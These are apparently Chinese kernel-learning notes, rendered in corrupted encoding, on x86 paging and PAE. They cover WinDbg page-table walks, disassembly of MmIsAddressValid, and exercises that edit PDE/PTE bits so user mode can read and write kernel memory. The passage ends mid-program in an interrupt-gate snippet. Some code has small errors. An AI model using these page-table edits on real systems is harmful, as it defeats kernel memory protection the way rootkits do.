æ‰¾ç‰©ç†åœ°å€\nä½¿ç”¨ceæŸ¥æ‰¾è®°äº‹æœ¬è¿›ç¨‹ä¸­çš„å­—ç¬¦ä¸²ï¼Œä¿®æ”¹è®°äº‹æœ¬ä¸­çš„å­—ç¬¦ä¸²ä»¥æ‰¾åˆ°çœŸæ­£çš„å­—ç¬¦ä¸²çš„åœ°å€ã€‚\nå…ˆå°†è¿™ä¸ªåœ°å€è¿›è¡Œ10-10-12åˆ†é¡µï¼ˆæ¯”å¦‚æˆ‘çš„åœ°å€æ˜¯ï¼š000AB3A0ï¼‰\nè½¬æˆäºŒè¿›åˆ¶ï¼š0000 0000 00|00 1010 1011 3A0\né‚£ä¹ˆè¿™ä¸¤ç»„çš„å€¼ä¸ºï¼š0ï¼ŒAB åŠ ä¸Šåé¢çš„ 3A0\nå°†ç¬¬äºŒç»„å€¼Ã—4ï¼š0ï¼ŒAB*4ï¼Œ3A0\nè¿™ä¸‰ç»„å°±æ˜¯ä¸‰ä¸ªé¡µçš„offset\nåœ¨windbgä¸­ä½¿ç”¨æŒ‡ä»¤ï¼process 0 0ï¼ŒæŸ¥çœ‹notepadçš„Cr3ï¼Œå°±æ˜¯é‚£ä¸ªDirBaseçš„å€¼\nä½¿ç”¨æŒ‡ä»¤ï¼dd [åœ°å€] è¯»å–çº¿æ€§åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯Cr3çš„å€¼åŠ ä¸Šç¬¬ä¸€ä¸ªoffsetï¼Œæ‰¾åˆ°çš„æ˜¯ç¬¬äºŒä¸ªé¡µçš„åœ°å€ï¼ˆåä¸‰ä½067æ”¹ä¸º0æ‰æ˜¯åœ°å€ï¼Œ067æ˜¯å±æ€§ï¼‰ï¼Œç¬¬äºŒä¸ªé¡µçš„åœ°å€åŠ ä¸Šç¬¬äºŒä¸ªoffsetï¼Œæ‰¾åˆ°çš„æ˜¯ç‰©ç†é¡µçš„åœ°å€ï¼ˆåä¸‰ä½067æ”¹ä¸º0æ‰æ˜¯åœ°å€ï¼‰ï¼Œç‰©ç†é¡µçš„åœ°å€åŠ ä¸Šç¬¬ä¸‰ä¸ªoffsetï¼Œæ‰¾åˆ°çš„å°±æ˜¯å­—ç¬¦ä¸²çš„ç‰©ç†åœ°å€ã€‚\nåˆ›å»ºä¸¤ä¸ªè¿›ç¨‹ï¼Œç”³è¯·ä¸€ä¸ªç›¸åŒçš„å†…å­˜åœ°å€ï¼Œæ¯”å¦‚: 0x401234ï¼Œå¹¶å­˜å‚¨ä¸åŒçš„å†…å®¹ï¼Œåˆ†åˆ«æ‰¾åˆ°è¿™2ä¸ªè¿›ç¨‹ç›¸å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œçœ‹å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿè¯´è¯´ä½ çš„ç†è§£\nPDE_PTE çº¿æ€§åœ°å€0ä¸ºä»€ä¹ˆä¸èƒ½è®¿é—®ï¼Ÿå°†0åœ°å€è®¾ç½®ä¸ºå¯è¯»å¯å†™ã€‚\næ¯”å¦‚æˆ‘è§‚å¯Ÿä¸€ä¸ªè¿›ç¨‹çš„Cr3ï¼ŒPDTä¸PTTï¼Œå¦‚ä¸‹ï¼š\nPROCESS 89c25be0 SessionId: 0 Cid: 0674 Peb: 7ffd9000 ParentCid: 05c4 DirBase: 1cd3e000 ObjectTable: e2848690 HandleCount: 50. Image: notepad.exe kd\u003e !dd 1cd3e000 #1cd3e000 1cdb0867 1d261867 1cfb1867 00000000 #1cd3e010 1cfe3867 00000000 00000000 00000000 #1cd3e020 00000000 00000000 00000000 00000000 #1cd3e030 00000000 00000000 00000000 00000000 #1cd3e040 00000000 00000000 00000000 00000000 #1cd3e050 00000000 00000000 00000000 00000000 #1cd3e060 00000000 00000000 00000000 00000000 #1cd3e070 00000000 00000000 00000000 00000000 kd\u003e !dd 1cdb0000 #1cdb0000 00000000 00000000 00000000 00000000 #1cdb0010 00000000 00000000 00000000 00000000 #1cdb0020 00000000 00000000 00000000 00000000 #1cdb0030 00000000 00000000 00000000 00000000 #1cdb0040 1ce71867 00000000 00000000 00000000 #1cdb0050 00000000 00000000 00000000 00000000 #1cdb0060 00000000 00000000 00000000 00000000 #1cdb0070 00000000 00000000 00000000 00000000 å¯ä»¥çœ‹åˆ°ï¼Œè¿›ç¨‹ä¸­çº¿æ€§åœ°å€0çš„PTTä¸º0ï¼Œä¹Ÿå°±æ˜¯PTEä¸­çš„Pä½ä¸º0ï¼Œè¡¨ç¤ºPTEæ— æ•ˆï¼Œæ‰€ä»¥ä¸èƒ½è¢«è®¿é—®ï¼Œä½†æ˜¯PDEæ˜¯æœ‰æ•ˆçš„ï¼Œæ‰€ä»¥å¯ä»¥é‡æ–°æ”¹ä¸€ä¸ªæœ‰æ•ˆçš„PTEå°±å¯ä»¥è®¿é—®äº†å§ã€‚\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e int main() { int x=1; printf(\"xï¼š%x\\n\",\u0026x); getchar(); //å‘0åœ°å€å†™å…¥æ•°æ® *(int*)0 = 123; printf(\"xåœ°å€æ•°æ®:%x\\n\",*(int*)0); getchar(); return 0; } è¿‡ç¨‹å¦‚ä¸‹ï¼š\n0012ff7c 0000 0000 0001 0010 1111 f7c 1ï¼š0 2ï¼š4BC 3ï¼šf7c Failed to get VadRoot PROCESS 89b9f558 SessionId: 0 Cid: 05b8 Peb: 7ffdd000 ParentCid: 0180 DirBase: 27943000 ObjectTable: e1085490 HandleCount: 12. Image: 111.exe kd\u003e !dd 27943000 #27943000 27872867 27971867 00000000 00000000 #27943010 00000000 00000000 00000000 00000000 #27943020 00000000 00000000 00000000 00000000 #27943030 00000000 00000000 00000000 00000000 #27943040 00000000 00000000 00000000 00000000 #27943050 00000000 00000000 00000000 00000000 #27943060 00000000 00000000 00000000 00000000 #27943070 00000000 00000000 00000000 00000000 kd\u003e !dd 27872000 #27872000 00000000 00000000 00000000 00000000 #27872010 00000000 00000000 00000000 00000000 #27872020 00000000 00000000 00000000 00000000 #27872030 00000000 00000000 00000000 00000000 #27872040 279f3867 00000000 00000000 00000000 #27872050 00000000 00000000 00000000 00000000 #27872060 00000000 00000000 00000000 00000000 #27872070 00000000 00000000 00000000 00000000 kd\u003e !dd 27872000+4BC #278724bc 27877867 16360025 16361025 00000000 #278724cc 00000000 00000000 00000000 00000000 #278724dc 00000000 00000000 00000000 00000000 #278724ec 00000000 00000000 00000000 00000000 #278724fc 00000000 279fb867 27abc867 27c7d867 #2787250c 00000000 00000000 00000000 00000000 #2787251c 00000000 00000000 00000000 00000000 #2787252c 00000000 00000000 00000000 00000000 kd\u003e !ed 27872000 27877867 è¾“å‡ºç»“æœï¼šxåœ°å€æ•°æ®:7b ä¸ºå˜é‡xå†æ˜ å°„ä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œå¹¶é€šè¿‡è¿™ä¸ªæ–°çš„åœ°å€è¯»å–xçš„å€¼ã€‚\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e int main() { int x=1; int y[1024]={0}; printf(\"xï¼š%x\\n\",\u0026x); printf(\"yï¼š%x\\n\",\u0026y); getchar(); printf(\"xåœ°å€æ•°æ®:%x\\n\",x); getchar(); return 0; } x:0012ff7c 0000 0000 0001 0010 1111 f7c 1ï¼š0 2ï¼š4BC 3ï¼šf7c y:0012ef7c 0000 0000 0001 0010 1110 f7c 1ï¼š0 2ï¼š4B8 3ï¼šf7c å°†xçš„PDEæ”¹ä¸ºyçš„ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š\nFailed to get VadRoot PROCESS 89c1d7e8 SessionId: 0 Cid: 052c Peb: 7ffd3000 ParentCid: 079c DirBase: 20ff4000 ObjectTable: e28b0ad8 HandleCount: 12. Image: 111.exe kd\u003e !dd 20ff4000 #20ff4000 20e5d867 20d9c867 00000000 00000000 #20ff4010 00000000 00000000 00000000 00000000 #20ff4020 00000000 00000000 00000000 00000000 #20ff4030 00000000 00000000 00000000 00000000 #20ff4040 00000000 00000000 00000000 00000000 #20ff4050 00000000 00000000 00000000 00000000 #20ff4060 00000000 00000000 00000000 00000000 #20ff4070 00000000 00000000 00000000 00000000 kd\u003e !dd 20e5d000+4b8 #20e5d4b8 210c8867 20ffb867 163df025 16420025 #20e5d4c8 00000000 00000000 00000000 00000000 #20e5d4d8 00000000 00000000 00000000 00000000 #20e5d4e8 00000000 00000000 00000000 00000000 #20e5d4f8 00000000 00000000 20dff867 21300867 #20e5d508 20f81867 00000000 00000000 00000000 #20e5d518 00000000 00000000 00000000 00000000 #20e5d528 00000000 00000000 00000000 00000000 kd\u003e !ed 20e5d4bc 210c8867 ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä¿®æ”¹å®Œï¼Œæ‰§è¡Œåä¼šè“å±ï¼ï¸¿ï¼œ\n10-10-12åˆ†é¡µæ¨¡å¼ç‰©ç†å†…å­˜èƒ½å¤Ÿè¯†åˆ«çš„æœ€å¤šèŒƒå›´æ˜¯å¤šå°‘?\n1024 *1024 *4096 ==ä¸€å…±4GB\nå¦‚ä½•åˆ¤æ–­2ä¸ªçº¿æ€§åœ°å€æ˜¯å¦åœ¨åŒä¸€ä¸ªç‰©ç†é¡µï¼Ÿ\nç‰©ç†åœ°å€é™¤äº†æœ€åä¸‰ä½ä»¥å¤–å…¶ä»–çš„ä½æ•°éƒ½ç›¸ç­‰ï¼Œå°±æ˜¯åŒä¸€ç‰©ç†é¡µ\nPDE_PTEå±æ€§ åœ¨VC6ä¸­å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡ é€šè¿‡å¦å¤–ä¸€ä¸ªçº¿æ€§åœ°å€ä¿®æ”¹è¿™ä¸ªå¸¸é‡çš„å€¼ ä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e char* a=\"c65mael\"; int main(int argc, char* argu[]) { printf(\"%x\",a); getchar(); a[1]='a'; printf(\"%s\",a); getchar(); return 0; } a:0042201c 0000 0000 0100 0010 0010 01c 1ï¼š1*4 2ï¼š22*4 3ï¼š01c è¿‡ç¨‹å¦‚ä¸‹ï¼š\nFailed to get VadRoot PROCESS 89e63020 SessionId: 0 Cid: 0520 Peb: 7ffd9000 ParentCid: 07cc DirBase: 2ff55000 ObjectTable: e1babc00 HandleCount: 12. Image: 111.exe kd\u003e !dd 2ff55000+4 #2ff55004 2ffd9867 00000000 00000000 00000000 #2ff55014 00000000 00000000 00000000 00000000 #2ff55024 00000000 00000000 00000000 00000000 #2ff55034 00000000 00000000 00000000 00000000 #2ff55044 00000000 00000000 00000000 00000000 #2ff55054 00000000 00000000 00000000 00000000 #2ff55064 00000000 00000000 00000000 00000000 #2ff55074 00000000 00000000 00000000 00000000 kd\u003e !dd 2ffd9000+88 #2ffd9088 30085025 00000000 301d2867 30488225 #2ffd9098 00000000 3024b867 3040d867 30413867 #2ffd90a8 303f2825 00000000 00000000 00000000 #2ffd90b8 00000000 00000000 00000000 00000000 #2ffd90c8 00000000 00000000 00000000 00000000 #2ffd90d8 00000000 00000000 00000000 00000000 #2ffd90e8 00000000 00000000 00000000 00000000 #2ffd90f8 00000000 00000000 00000000 00000000 kd\u003e !ed 2ffd9088 30085027 ä¿®æ”¹0x8003F00Cè¿™ä¸ªåœ°å€çš„PDE PTEå±æ€§ä½¿ä¹‹å¯ä»¥åœ¨3ç¯è®¿é—®\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e int main(int argc, char* argu[]) { int x=0x8003F00C; getchar(); printf(\"%x\",*(int*)a); return 0; } 8003F00C 1000 0000 0000 0011 1111 00c 1ï¼š200*4 2ï¼š3f*4 3ï¼š00c è¿‡ç¨‹å¦‚ä¸‹ï¼š\nFailed to get VadRoot PROCESS 897b1518 SessionId: 0 Cid: 032c Peb: 7ffd9000 ParentCid: 02dc DirBase: 227cc000 ObjectTable: e28a8448 HandleCount: 12. Image: 111.exe kd\u003e !dd 227cc000+800 #227cc800 0003b163 004009e3 0003e163 0003c163 #227cc810 010009e3 014009e3 018009e3 01c009e3 #227cc820 020009e3 024009e3 028009e3 02c009e3 #227cc830 030009e3 034009e3 038009e3 03c009e3 #227cc840 040009e3 044009e3 048009e3 04c009e3 #227cc850 050009e3 054009e3 058009e3 05c009e3 #227cc860 060009e3 064009e3 068009e3 06c009e3 #227cc870 070009e3 074009e3 078009e3 07c009e3 kd\u003e !ed 227cc800 0003b167 kd\u003e !dd 0003b0fc # 3b0fc 0003f167 00040103 00041103 00042163 # 3b10c 00043163 00044163 00000000 00000000 # 3b11c 00000000 00000000 00000000 00000000 # 3b12c 00000000 00000000 00000000 00000000 # 3b13c 00000000 00000000 00000000 00000000 # 3b14c 00000000 00000000 00000000 00000000 # 3b15c 00000000 00000000 00000000 00000000 # 3b16c 00000000 00000000 00000000 00000000 kd\u003e !ed 3b0fc 0003f867 æ€è€ƒé¢˜ï¼šä¸€ä¸ªçº¿æ€§åœ°å€å¦‚æœå¯ä»¥è®¿é—®ï¼Œä¸€å®šè¦å¡«ä¸Šæ­£ç¡®çš„PDEå’ŒPTEï¼Œä½†PDEä¸PTEæ˜¯ç‰©ç†åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¡«å……ï¼Œé‚£åˆå¿…é¡»è¦é€šè¿‡çº¿æ€§åœ°å€æ‰èƒ½å»è®¿é—®ï¼Œè°ä¸ºè®¿é—®PDEä¸PTEçš„çº¿æ€§åœ°å€å¡«å……äº‰å–çš„PDEä¸PTEå‘¢?\nCPUé€šè¿‡â€œé¡µè¡¨â€æ¥æ‰¾åˆ°å†…å­˜ä¸­çš„æ•°æ®ï¼Œè€Œâ€œé¡µè¡¨â€æœ¬èº«ä¹Ÿæ”¾åœ¨å†…å­˜é‡Œã€‚ä½ æƒ³è®¿é—®é¡µè¡¨æ—¶ï¼Œä¹Ÿå¾—å…ˆé€šè¿‡é¡µè¡¨æ¥æ‰¾åˆ°é¡µè¡¨çš„ä½ç½®ã€‚è¿™å¬èµ·æ¥åƒæ˜¯â€œå…ˆæœ‰é¸¡è¿˜æ˜¯å…ˆæœ‰è›‹â€çš„é—®é¢˜ã€‚ å®é™…ä¸Šï¼Œç³»ç»Ÿæœ‰ä¸ªèªæ˜çš„åŠæ³•ï¼šå®ƒæŠŠâ€œé¡µè¡¨â€è‡ªå·±ä¹Ÿæ”¾åˆ°å®ƒç®¡ç†çš„åœ°å€é‡Œé¢ï¼å°±å¥½åƒç»™â€œé¡µè¡¨â€ç•™äº†ä¸€é¢é•œå­ï¼Œè¿™æ ·ä½ å°±å¯ä»¥é€šè¿‡è¿™ä¸ªé•œå­ï¼ˆä¸€ä¸ªç‰¹æ®Šçš„åœ°å€ï¼‰çœ‹åˆ°å¹¶è®¿é—®é¡µè¡¨æœ¬èº«ã€‚è¿™æ ·ï¼ŒCPUå°±å¯ä»¥é€šè¿‡è¿™ä¸ªè‡ªå¸¦çš„â€œé•œå­â€æ¥å…ˆæ‰¾åˆ°é¡µè¡¨ï¼Œç„¶åå†å»ç®¡ç†å…¶ä»–çš„å†…å­˜æ•°æ®ã€‚ æ‰€ä»¥ï¼Œæ˜¯æ“ä½œç³»ç»Ÿç»™é¡µè¡¨è®¾ç½®äº†ä¸€ä¸ªç‰¹æ®Šçš„â€œé•œå­â€åœ°å€ï¼Œè¿™æ ·å³ä½¿ä½ è¦æ‰¾é¡µè¡¨ï¼Œå®ƒä¹Ÿèƒ½è®©ä½ æ‰¾åˆ°ã€‚ PDT:0xc0300000 åˆ›å»º2ä¸ªè¿›ç¨‹ï¼Œä»¥é¡µä¸ºä»£ç æ‹†åˆ†0-4Gçº¿æ€§åœ°å€\nç»“æœï¼š\nä½2Gï¼ˆ0-7FFFFFFFï¼‰å‡ ä¹ä¸åŒ é«˜2Gï¼ˆ80000000-FFFFFFFFï¼‰å‡ ä¹ç›¸åŒ 0-7FFFFFFFçš„å‰64Kå’Œå64kéƒ½æ˜¯æ²¡æœ‰æ˜ å°„çš„ PDT_PTTåŸºå€ é€†å‘åˆ†æMmIsAddressValidå‡½æ•°\n804e2f46 8bff mov edi,edi 804e2f48 55 push ebp ;ä¿æŠ¤ç°åœº 804e2f49 8bec mov ebp,esp 804e2f4b 8b4d08 mov ecx,dword ptr [ebp+8] ;å–ä¸€ä¸ªæ ˆä¸Šçš„å€¼åšå‚æ•°(VirtualAddress) 804e2f4e 8bc1 mov eax,ecx ;eax=VirtualAddress 804e2f50 c1e814 shr eax,14h ;eaxå³ç§»20ä½ï¼Œä¿ç•™é«˜12ä½ 804e2f53 bafc0f0000 mov edx,0FFCh ;edx=0xffc(1111 1111 1100) 804e2f58 23c2 and eax,edx ;ä¸è¦ä½ä¸¤ä½ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ª10 804e2f5a 2d0000d03f sub eax,-0C0300000h ;eax+0xC0300000ï¼Œé¡µç›®å½•è¡¨ 804e2f5f 8b00 mov eax,dword ptr [eax] ;å–eaxåœ°å€çš„å€¼ã€‚ä¹Ÿå°±æ˜¯PDE 804e2f61 a801 test al,1 ;åˆ¤æ–­pä½æ˜¯å¦ä¸º1 804e2f63 0f844e3e0100 je nt!MmIsAddressValid+0x4f (804f6db7) 804e2f69 84c0 test al,al ;åˆ¤æ–­psä½,æ˜¯å¦ä¸ºå¤§é¡µ(å› ä¸ºç¬¬7ä½ä¸º1æ—¶ä¼šè¢«è®¤ä¸ºè´Ÿæ•°) 804e2f6b 7824 js nt!MmIsAddressValid+0x53 (804e2f91) 804e2f6d c1e90a shr ecx,0Ah ;ecxå³ç§»10ä½,ä¿ç•™é«˜20ä½ 804e2f70 81e1fcff3f00 and ecx,3FFFFCh ;å»é«˜ä¸¤ä½ä¸ä½ä¸¤ä½ 804e2f76 81e900000040 sub ecx,-0C0000000h ;eax+0xC0000000ï¼Œé¡µè¡¨ 804e2f7c 8bc1 mov eax,ecx 804e2f7e 8b08 mov ecx,dword ptr [eax] ;å–eaxåœ°å€çš„å€¼ã€‚ä¹Ÿå°±æ˜¯PTE 804e2f80 f6c101 test cl,1 ;åˆ¤æ–­pä½æ˜¯å¦ä¸º1 804e2f83 0f842e3e0100 je nt!MmIsAddressValid+0x4f (804f6db7) 804e2f89 84c9 test cl,cl ;åˆ¤æ–­PATä½ 804e2f8b 0f88d5410400 js nt!MmIsAddressValid+0x3f (80527166) 804e2f91 b001 mov al,1 804e2f93 5d pop ebp 804e2f94 c20400 ret 4 2-9-9-12åˆ†é¡µ åœ¨2-9-9-12åˆ†é¡µæ¨¡å¼ä¸‹è¿›è¡Œçº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdio.h\u003e int main(int argc, char* argu[]) { int a=10; printf(\"%x\",\u0026a); getchar(); printf(\"%x\",a); return 0; } 0x0012ff7c 0000 0000 00|01 0010 1111 f7c 1:0 2:12f*8ï¼ˆä¸€å®šæ³¨æ„ï¼‰ 3:f7c è¿‡ç¨‹å¦‚ä¸‹ï¼š\nFailed to get VadRoot PROCESS 8a316be0 SessionId: 0 Cid: 017c Peb: 7ffda000 ParentCid: 0584 DirBase: 0aac0380 ObjectTable: e272aec0 HandleCount: 12. Image: 111.exe kd\u003e !dd 0aac0380 # aac0380 225ad801 00000000 226ee801 00000000ï¼ˆè¿™ä¸ªå°±æ˜¯PDPTEï¼Œä¸æ˜¯åªæœ‰4ä¸ªå—ï¼Ÿï¼‰ # aac0390 227af801 00000000 2236c801 00000000 # aac03a0 bae713c0 00000000 21da9801 00000000 # aac03b0 21bea801 00000000 21ca7801 00000000 # aac03c0 bae713e0 00000000 00000000 00000000 # aac03d0 00000000 00000000 00000000 00000000 # aac03e0 bae71400 00000000 00000000 00000000 # aac03f0 00000000 00000000 00000000 00000000 kd\u003e !dd 225ad000 #225ad000 22471867 00000000 227d4867 00000000 #225ad010 225f0867 00000000 00000000 00000000 #225ad020 00000000 00000000 00000000 00000000 #225ad030 00000000 00000000 00000000 00000000 #225ad040 00000000 00000000 00000000 00000000 #225ad050 00000000 00000000 00000000 00000000 #225ad060 00000000 00000000 00000000 00000000 #225ad070 00000000 00000000 00000000 00000000 kd\u003e !dd 22471000+12f*8 #22471978 2270d867 80000000 16fff025 80000000 #22471988 17400025 80000000 00000000 00000000 #22471998 00000000 00000000 00000000 00000000 #224719a8 00000000 00000000 00000000 00000000 #224719b8 00000000 00000000 00000000 00000000 #224719c8 00000000 00000000 00000000 00000000 #224719d8 00000000 00000000 00000000 00000000 #224719e8 00000000 00000000 00000000 00000000 kd\u003e !dd 2270d000+f7c #2270df7c 0000000a 0012ffc0 00401299 00000001 #2270df8c 00380d60 00380df8 00000000 00000000 #2270df9c 7ffda000 00000001 00000001 0012ff94 #2270dfac b13f8d08 0012ffe0 00404440 00423130 #2270dfbc 00000000 0012fff0 7c817067 00000000 #2270dfcc 00000000 7ffda000 8054c6ed 0012ffc8 #2270dfdc 8a162980 ffffffff 7c839ac0 7c817070 #2270dfec 00000000 00000000 00000000 004011b0 kd\u003e !ed 2270df7c 9 kd\u003e !dd 2270d000+f7c #2270df7c 00000009 0012ffc0 00401299 00000001 #2270df8c 00380d60 00380df8 00000000 00000000 #2270df9c 7ffda000 00000001 00000001 0012ff94 #2270dfac b13f8d08 0012ffe0 00404440 00423130 #2270dfbc 00000000 0012fff0 7c817067 00000000 #2270dfcc 00000000 7ffda000 8054c6ed 0012ffc8 #2270dfdc 8a162980 ffffffff 7c839ac0 7c817070 #2270dfec 00000000 00000000 00000000 004011b0 ç»™0çº¿æ€§åœ°å€æŒ‚ä¸Šç‰©ç†é¡µã€‚\nä»£ç å¦‚ä¸‹ï¼š\n#include \u003cWindows.h\u003e #include \u003cstdio.h\u003e int main(int argc, char* argu[]) { int *a=0; int b = 8888; printf(\"%x\",\u0026b); getchar(); printf(\"%x\",*a); getchar(); return 0; } 0x12ff78 0000 0000 0001 0010 1111 f78 1:0 2:12f*8 3:f78 è¿‡ç¨‹å¦‚ä¸‹ï¼š\nFailed to get VadRoot PROCESS 8a3f68d8 SessionId: 0 Cid: 0210 Peb: 7ffd3000 ParentCid: 06fc DirBase: 0aac03a0 ObjectTable: e1396468 HandleCount: 12. Image: 111.exe kd\u003e !dd 0aac03a0 # aac03a0 3071b801 00000000 3095c801 00000000 # aac03b0 3075d801 00000000 3085a801 00000000 # aac03c0 bae713e0 00000000 00000000 00000000 # aac03d0 00000000 00000000 00000000 00000000 # aac03e0 bae71400 00000000 00000000 00000000 # aac03f0 00000000 00000000 00000000 00000000 # aac0400 bae71420 00000000 00000000 00000000 # aac0410 00000000 00000000 00000000 00000000 kd\u003e !dd 3071b000 #3071b000 3079d867 00000000 30a69867 00000000 #3071b010 3099c867 00000000 00000000 00000000 #3071b020 00000000 00000000 00000000 00000000 #3071b030 00000000 00000000 00000000 00000000 #3071b040 00000000 00000000 00000000 00000000 #3071b050 00000000 00000000 00000000 00000000 #3071b060 00000000 00000000 00000000 00000000 #3071b070 00000000 00000000 00000000 00000000 kd\u003e !dd 3079d000+12f*8 #3079d978 307e2867 80000000 16cae025 80000000 #3079d988 16caf025 80000000 00000000 00000000 #3079d998 00000000 00000000 00000000 00000000 #3079d9a8 00000000 00000000 00000000 00000000 #3079d9b8 00000000 00000000 00000000 00000000 #3079d9c8 00000000 00000000 00000000 00000000 #3079d9d8 00000000 00000000 00000000 00000000 #3079d9e8 00000000 00000000 00000000 00000000 kd\u003e !dd 307e2000+f78 #307e2f78 000022b8 00000000 0012ffc0 004012a9 #307e2f88 00000001 00380d60 00380df8 00000000 #307e2f98 00000000 7ffd3000 00000001 00000001 #307e2fa8 0012ff94 b1de6d08 0012ffe0 00404450 #307e2fb8 00423130 00000000 0012fff0 7c817067 #307e2fc8 00000000 00000000 7ffd3000 8054c6ed #307e2fd8 0012ffc8 8a402da8 ffffffff 7c839ac0 #307e2fe8 7c817070 00000000 00000000 00000000 kd\u003e !dd 0aac03a0 # aac03a0 3071b801 00000000 3095c801 00000000 # aac03b0 3075d801 00000000 3085a801 00000000 # aac03c0 bae713e0 00000000 00000000 00000000 # aac03d0 00000000 00000000 00000000 00000000 # aac03e0 bae71400 00000000 00000000 00000000 # aac03f0 00000000 00000000 00000000 00000000 # aac0400 bae71420 00000000 00000000 00000000 # aac0410 00000000 00000000 00000000 00000000 kd\u003e !dd 3079d000 #3079d000 00000000 00000000 00000000 00000000 #3079d010 00000000 00000000 00000000 00000000 #3079d020 00000000 00000000 00000000 00000000 #3079d030 00000000 00000000 00000000 00000000 #3079d040 00000000 00000000 00000000 00000000 #3079d050 00000000 00000000 00000000 00000000 #3079d060 00000000 00000000 00000000 00000000 #3079d070 00000000 00000000 00000000 00000000 kd\u003e !ed 3079d000 307e2867 é€†å‘åˆ†æMmisAddressValidå‡½æ•°ï¼Œæ‰¾åˆ°PAEåˆ†é¡µæ¨¡å¼ä¸‹é¡µç›®å½•è¡¨ã€é¡µè¡¨åŸºå€ã€‚\n80514928 8bff mov edi,edi 8051492a 55 push ebp 8051492b 8bec mov ebp,esp 8051492d 51 push ecx 8051492e 51 push ecx 8051492f 8b4d08 mov ecx,dword ptr [ebp+8] 80514932 56 push esi 80514933 8bc1 mov eax,ecx 80514935 c1e812 shr eax,12h #å³ç§»18ä½ 80514938 bef83f0000 mov esi,3FF8h 8051493d 23c6 and eax,esi #è¿›è¡Œä¸è¿ç®—ï¼Œ0011 1111 1111 1000 å‰©11ä½ 8051493f 2d0000a03f sub eax,3FA00000h #eax+0xC0600000 80514944 8b10 mov edx,dword ptr [eax] #å–PDEä½å››å­—èŠ‚ 80514946 8b4004 mov eax,dword ptr [eax+4] #å–PDEé«˜å››å­—èŠ‚ 80514949 8945fc mov dword ptr [ebp-4],eax 8051494c 8bc2 mov eax,edx 8051494e 57 push edi 8051494f 83e001 and eax,1 80514952 33ff xor edi,edi 80514954 0bc7 or eax,edi 80514956 7461 je nt!MmIsAddressValid+0x91 (805149b9) 80514958 bf80000000 mov edi,80h 8051495d 23d7 and edx,edi 8051495f 6a00 push 0 80514961 8955f8 mov dword ptr [ebp-8],edx 80514964 58 pop eax 80514965 7404 je nt!MmIsAddressValid+0x43 (8051496b) 80514967 85c0 test eax,eax 80514969 7452 je nt!MmIsAddressValid+0x95 (805149bd) 8051496b c1e909 shr ecx,9 #å³ç§»9ä½ 8051496e 81e1f8ff7f00 and ecx,7FFFF8h #è¿›è¡Œä¸è¿ç®—ï¼Œ0111 1111 1111 1111 1111 1000 å‰©20ä½ 80514974 8b81040000c0 mov eax,dword ptr [ecx-3FFFFFFCh] #mov eax, [ecx+0xC0000004] 8051497a 81e900000040 sub ecx,40000000h #ecx+0xC0000000 80514980 8b11 mov edx,dword ptr [ecx] #å–PTEä½å››å­—èŠ‚ 80514982 8945fc mov dword ptr [ebp-4],eax #é«˜4ä½åœ¨æ ˆä¸Š 80514985 53 push ebx 80514986 8bc2 mov eax,edx 80514988 33db xor ebx,ebx 8051498a 83e001 and eax,1 8051498d 0bc3 or eax,ebx 8051498f 5b pop ebx 80514990 7427 je nt!MmIsAddressValid+0x91 (805149b9) 80514992 23d7 and edx,edi 80514994 6a00 push 0 80514996 8955f8 mov dword ptr [ebp-8],edx 80514999 58 pop eax 8051499a 7421 je nt!MmIsAddressValid+0x95 (805149bd) 8051499c 85c0 test eax,eax 8051499e 751d jne nt!MmIsAddressValid+0x95 (805149bd) 805149a0 23ce and ecx,esi 805149a2 8b89000060c0 mov ecx,dword ptr [ecx-3FA00000h] 805149a8 b881000000 mov eax,81h 805149ad 23c8 and ecx,eax 805149af 33d2 xor edx,edx 805149b1 3bc8 cmp ecx,eax 805149b3 7508 jne nt!MmIsAddressValid+0x95 (805149bd) 805149b5 85d2 test edx,edx 805149b7 7504 jne nt!MmIsAddressValid+0x95 (805149bd) 805149b9 32c0 xor al,al 805149bb eb02 jmp nt!MmIsAddressValid+0x97 (805149bf) 805149bd b001 mov al,1 805149bf 5f pop edi 805149c0 5e pop esi 805149c1 c9 leave 805149c2 c20400 ret 4 ä¿®æ”¹é¡µå±æ€§ï¼Œå®ç°åº”ç”¨å±‚è¯»å†™é«˜2Gå†…å­˜åœ°å€ã€‚\næµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n#include \u003cstdio.h\u003e #include\u003cwindows.h\u003e char buf[6]={0,0,0,0,0x48,0}; DWORD *GetPDE(DWORD addr) { //return (DWORD *)(0xc0600000 + ((addr \u003e\u003e 18) \u0026 0x3ff8)); DWORD PDPTI = addr \u003e\u003e 30; DWORD PDI = (addr \u003e\u003e 21) \u0026 0x000001FF; DWORD PTI = (addr \u003e\u003e 12) \u0026 0x000001FF; return (DWORD *)(0xC0600000 + PDPTI * 0x1000 + PDI * 8); } DWORD *GetPTE(DWORD addr) { //return (DWORD *)(0xc0000000 + ((addr \u003e\u003e 9) \u0026 0x7ffff8)); DWORD PDPTI = addr \u003e\u003e 30; DWORD PDI = (addr \u003e\u003e 21) \u0026 0x000001FF; DWORD PTI = (addr \u003e\u003e 12) \u0026 0x000001FF; return (DWORD *)(0xC0000000 + PDPTI * 0x200000 + PDI * 0x1000 + PTI * 8); } __declspec(naked) void func() { __asm { pushad pushfd } *GetPDE(0x8003f048) |=0x00000004; *GetPTE(0x8003f048) |=0x00000004; *GetPTE(0x8003f048) \u0026= 0xFFFFFEFF; __asm { popad popfd iretd } } int main(int argc, char* argv[]) { printf(\"%x\",(DWORD)func); getchar(); __asm int 0x20; 